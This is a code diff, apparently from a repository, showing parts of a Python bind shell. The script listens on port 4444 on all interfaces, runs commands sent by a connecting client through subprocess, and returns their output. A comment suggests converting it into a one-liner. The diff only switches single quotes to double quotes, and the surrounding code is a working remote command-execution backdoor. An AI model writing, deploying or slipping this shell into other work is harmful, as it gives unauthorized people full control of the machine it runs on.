@@ -2,7 +2,7 @@
 # use "http://jagt.github.io/python-single-line-convert/" to convert it to a on-liner
 import socket,os,subprocess
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-c.bind(('0.0.0.0', 4444))
+c.bind(("0.0.0.0", 4444))
 c.listen(1)
 s,a = c.accept()
 while True:
@@ -16,6 +16,6 @@ while True:
         stdoutput = proc.stdout.read() + proc.stderr.read()
         stdoutput.decode()
         s.sendall(stdoutput)
-    s.sendall('EOFX'.encode())
-s.send('Bye!'.encode())
+    s.sendall("EOFX".encode())
+s.send("Bye!".encode())
 s.close()
